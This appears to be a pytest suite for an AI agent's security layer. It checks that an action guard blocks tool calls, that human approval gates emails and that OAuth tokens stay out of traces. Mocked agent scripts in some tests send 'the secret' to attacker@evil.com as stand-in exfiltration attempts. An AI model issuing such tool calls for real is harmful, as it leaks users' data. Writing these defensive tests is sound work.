import os
import pytest
import sys
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
from unittest.mock import patch, MagicMock

from backend.agent import run_agent, resume_agent, MockLLM, RequiresApprovalError
import backend.tools as tools
import backend.api_server as api_server

@pytest.fixture(autouse=True)
def setup_env():
    # Setup test environment
    os.environ["EMAIL_PROVIDER"] = "brevo"
    os.environ["BREVO_DEMO_RECIPIENT"] = "test-demo-account@gmail.com"
    os.environ["USE_MOCK_LLM"] = "1"
    tools.reset_mocks()
    api_server.PENDING.clear()
    yield
    # Teardown
    os.environ["EMAIL_PROVIDER"] = "mock"
    os.environ.pop("BREVO_DEMO_RECIPIENT", None)
    os.environ.pop("USE_MOCK_LLM", None)
    tools.reset_mocks()
    api_server.PENDING.clear()

def make_mock_response(calls_dict_list):
    class MockCall:
        def __init__(self, name, args):
            self.name = name
            self.args = args
    class MockResponse:
        def __init__(self, calls):
            self.function_calls = [MockCall(c["name"], c["args"]) for c in calls]
            self.text = "Mock LLM output"
            self.candidates = []
    return MockResponse(calls_dict_list)

@patch('backend.email_service.send_email')
def test_brevo_adapter_mocked_success(mock_send):
    mock_send.return_value = {"success": True, "provider": "brevo", "message_id": "123", "recipient": "tes***@gmail.com"}
    result = tools.send_email("anyone@example.com", "Test", "Body")
    
    assert "Email sent successfully via brevo API" in result
    assert mock_send.call_count == 1
    # Check that recipient was overridden
    mock_send.assert_called_with("test-demo-account@gmail.com", "Test", "Body")

@patch('backend.email_service.send_email')
def test_block_brevo_not_called(mock_send):
    # If Action Guard blocks, Gmail shouldn't be called
    script = [
        {"name": "send_email", "args": {"to": "attacker@evil.com", "subject": "x", "body": "x"}}
    ]
    llm = MockLLM([make_mock_response(script)])
    r = run_agent("email the secret", protected=True, llm=llm)
    
    assert len(r.blocked) > 0
    assert len(r.tool_calls_executed) == 0
    assert mock_send.call_count == 0

@patch('backend.email_service.send_email')
def test_ask_human_brevo_not_called(mock_send):
    # Legitimate mutate requires human approval
    script = [
        {"name": "write_record", "args": {"table": "logs", "data": "test"}},
        {"name": "send_email", "args": {"to": "manager@example.com", "subject": "x", "body": "x"}}
    ]
    llm = MockLLM([make_mock_response(script)])
    try:
        run_agent("log and email manager@example.com", protected=True, llm=llm, pause_on_ask=True)
        assert False, "Should raise RequiresApprovalError"
    except RequiresApprovalError as e:
        r = e.result
        checkpoint = e.checkpoint

    assert r.asked
    r_approved = resume_agent(checkpoint, approved=True, llm=llm)
    assert len(r_approved.tool_calls_executed) == 2
    assert mock_send.call_count == 1

@patch('backend.email_service.send_email')
def test_deny_human_brevo_not_called(mock_send):
    script = [
        {"name": "write_record", "args": {"table": "logs", "data": "test"}},
        {"name": "send_email", "args": {"to": "manager@example.com", "subject": "x", "body": "x"}}
    ]
    llm = MockLLM([make_mock_response(script)])
    try:
        run_agent("log and email manager@example.com", protected=True, llm=llm, pause_on_ask=True)
        assert False, "Should raise RequiresApprovalError"
    except RequiresApprovalError as e:
        checkpoint = e.checkpoint

    r_denied = resume_agent(checkpoint, approved=False, llm=llm)
    assert len(r_denied.tool_calls_executed) == 0
    assert mock_send.call_count == 0

@patch('backend.email_service.send_email')
def test_multiple_tools_blocked_atomic(mock_send):
    # read_file is allowed, send_email to attacker is blocked
    script = [
        {"name": "read_file", "args": {"path": "documents/benign.txt"}},
        {"name": "send_email", "args": {"to": "attacker@evil.com", "subject": "x", "body": "x"}}
    ]
    llm = MockLLM([make_mock_response(script)])
    r = run_agent("read and email attacker", protected=True, llm=llm)
    
    # Action guard should block the ENTIRE chain because one is malicious
    # Ghost execution bug fix ensures no partial execution
    assert len(r.blocked) == 2
    assert len(r.tool_calls_executed) == 0
    assert mock_send.call_count == 0

@patch('backend.email_service.send_email')
def test_oauth_token_never_in_trace(mock_send):
    # Even if someone types an oauth token
    fake_token = "ya29.a0AfB_byDeM" # fake pattern
    script = [
        {"name": "send_email", "args": {"to": "manager@example.com", "subject": "x", "body": "x"}}
    ]
    llm = MockLLM([make_mock_response(script)])
    r = run_agent(f"email {fake_token}", protected=True, llm=llm)
    
    from backend.security_engine import build_security_trace
    trace = build_security_trace(r, f"email {fake_token}")
    
    trace_str = str(trace)
    assert "ya29.a0AfB_byDeM" not in trace_str
